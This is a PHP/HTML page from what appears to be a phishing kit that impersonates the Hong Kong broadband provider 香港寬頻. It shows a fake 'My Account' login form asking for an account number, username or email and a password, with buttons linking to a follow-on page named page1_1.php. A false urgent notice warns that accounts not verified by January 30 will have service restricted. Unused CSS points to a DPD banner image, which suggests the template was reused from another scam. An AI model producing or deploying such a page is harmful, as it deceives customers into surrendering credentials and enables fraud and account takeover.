<?php
include('header_.php');
?>
<style type="text/css">
    .home-bg-banner {
        background-image: url('https://www.dpd.com/wp-content/uploads/sites/226/2023/09/DPD_B2C_mobile_header_cms_600x325_v2.png');
        -o-object-fit: cover;
        object-fit: cover;
        -webkit-background-size: cover;
        background-size: cover;
        background-position: center center;
        background-repeat: no-repeat;
        height: 220px;
        position: relative;
    }

    .banner-right {
        position: absolute;
        bottom: 24px;
        left: 12px;
        color: white;
    }

    .home-input-search {
        border: 1px solid black;
    }

    .search_icon_home_banner {
        position: absolute;
        right: 12px;
        top: 12px;
    }

    .home-heading {
        font-weight: 600;
        font-size: 17px;
        font-weight: 500;
        line-height: 26px;
    }

    .row {
        display: flex;
    }

    /* .col {
        flex: 1;
    } */

    .progress-bar {
        width: 100%;
        height: 10px;
        background-color: #eee;
        border-radius: 10px;
        /* margin: 50px auto; */
    }

    .progress {
        height: 100%;
        width: 55%;
        background-color: #4caf50;
        border-radius: 8px;
        float: right;
    }

    .progress-two {
        height: 100%;
        width: 38%;
        background-color: #ccc;
        border-radius: 8px;
    }

    .left-green {
        display: none;
    }

    .right-red:after,
    .right-red:before {
        background: red;
    }

    .green-button {
        background-color: green;
        color: white;
        padding: 10px 70px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 16px;
        margin: 4px 2px;
        cursor: pointer;
        border-radius: 4px;
        margin-left: auto;
        margin-right: auto;
        display: block;
    }

    .sub-title {
        text-align: center;
    }

    .position-relative {
        position: relative;
    }

    .center-logo-bg {
        position: absolute;
        top: -42px;
        display: flex;
        justify-content: center;
        width: 100%;
    }

    .center-logo-bg span {
        width: 101px;
        text-align: center;
        display: flex;
        justify-content: center;
        background: #fff;
        padding: 5px;
    }

    .center-logo-bg span img {
        width: 31px;
    }

    .before-progress-abr {
        margin-top: 16px;
        margin-bottom: 51px;
        position: relative;
    }

    .before-progress-abr .amb-img-div {
        position: absolute;
        top: 1px;
        left: 35%;
    }

    .driver-amb-bg {
        position: absolute;
        left: 35px;
        top: 7px;
        z-index: -1;
        height: 50px;
    }

    .driver-details {
        height: fit-content;
        margin-top: auto;
        margin-bottom: auto;
        margin-left: 64px;
        margin-right: 10px;
    }

    .alrt-modify {
        border: none;
        box-shadow: 0px 2px 16px 0px #f30a0a3d;
        background: #fff;
        border-radius: 28px;
        margin-top: 37px;
    }

    .icon-alert {
        font-size: 23px;
        color: #F44336;
    }

    .red-gray::before {
        background-color: rgb(11, 35, 30) !important;
        z-index: 999;
    }

    .right-red {
        padding: 2px 0px 14px 20px;
    }
</style>

<!-- main Start -->
<section style="background-color: #fafafa;">
    <!-- <div class="home-bg-banner">
        <i class="fa-solid fa-chevron-right banner-right"></i>
    </div> -->

    <img src="<?php echo $folder_path;?>/images/5bcdcd3d-4496-4b81-bacb-f71799d0c2b2.jpeg" style="height: 200px; object-fit: cover;" alt="">
    <div style="background-color: #f68a33; padding: 10px; font-size: 14px; color: white">
        重要訊息：根據2024香港寬頻的最新政策，請再1月30日之前完成客戶賬戶的認證，未完成的用戶網絡服務將受到部分限制，請留意香港寬頻發出的短訊或者郵件通知，如遇到可疑情況，請即與我們聯絡。
    </div>

    <div style="background-color: #f5f8f9; padding: 20px 15px; display: flex; flex-direction: column; gap: 10px;">
        <div style="display: flex; gap: 20px">
            <img src="<?php echo $folder_path;?>/images/icons8-user-32.png" alt="">
            <div>登入「我的戶口」</div>
        </div>

        <div style="position: relative; width: 100%; border: 1px solid #d1d1d1">
            <input type="text" placeholder="賬戶號碼/用戶名稱/登入電郵" style="width: 100%; padding:15px;">
            <div style="position: absolute; right: 10px; top: 15px; color: gray;"></div>
        </div>
        <div style="position: relative; width: 100%; border: 1px solid #d1d1d1">
            <input oninput="onInput()" type="text" placeholder="密碼" style="width: 100%; padding:13px;">
            <div style="position: absolute; right: 10px; top: 13px; color: gray;">忘記</div>
        </div>
        <div>
            <input type="radio" name="" id=""> 記住我的賬戶號碼/用戶名稱/登入電郵
        </div>

        <!-- <div style="box-shadow: 0px 0px 2px 2px #0000000f; padding: 10px; width: fit-content;">
            <div style="display: flex; font-weight: 700; gap: 10px; align-items: center;">
                <div style="height: 25px; width: 25px; border: 1px solid gray; background: white"></div>
                <div>我不是自動程<br>式</div>
            </div>
            <div style="margin-top: 30px; display: flex; justify-content: center; font-size: 10px">
                <div style="display: flex; gap: 5px">
                    <img src="images/logo_48.png" style="height: 20px;" alt="">
                    <div>reCaptcha</div>
                </div>
            </div>
            <div style="margin-top: 5px; display: flex; justify-content: center; font-size: 10px;">
                私隱權政策 - 條款
            </div>
        </div> -->

        <a href="page1_1.php"> <button id="c_btn" style="padding: 15px; border-radius: 5px; color: white; background: #e1e1e1; width: 100%">登入</button></a>
        <a href="page1_1.php"><button style="padding: 15px; border-radius: 5px; color: #00508b; border: 1px solid #00508b; width: 100%">本機號碼一件登入</button></a>

        <div style="display:flex;">
            <div style="width: 50%; display:flex;">
                <img src="<?php echo $folder_path;?>/images/set.png" style="height: 20px;" alt=""><span>首次登入</span>
            </div>
            <div>訪客登記</div>
        </div>

    </div>
    <div style="margin-top: 20px; position: relative; height: 700px">
        <img src="<?php echo $folder_path;?>/images/app_banner_bg_mb_tc.94fe6acd.jpg" style="height: 100%; object-fit: cover;" alt="">
        <div style="position: absolute; top: 30px; left: 50%; transform: translateX(-50%); width: 320px">
            <div style="font-weight: 700; font-size: 20px;">香港寬頻手機應用程式 <br>
                隨時隨地 一手掌握</div>
            <div style="display:flex; gap: 20px; margin-top: 20px;">
                <img style="width: 150px;" src="<?php echo $folder_path;?>/images/google_play.png" alt="">
                <img style="width: 150px;" src="<?php echo $folder_path;?>/images/app_store.png" alt="">
            </div>
        </div>
    </div>




</section>



<?php include('footer_.php'); ?>
<script>
    function onInput(e) {
        document.getElementById("c_btn").style.backgroundColor = "#f68a33"
    }
    
</script>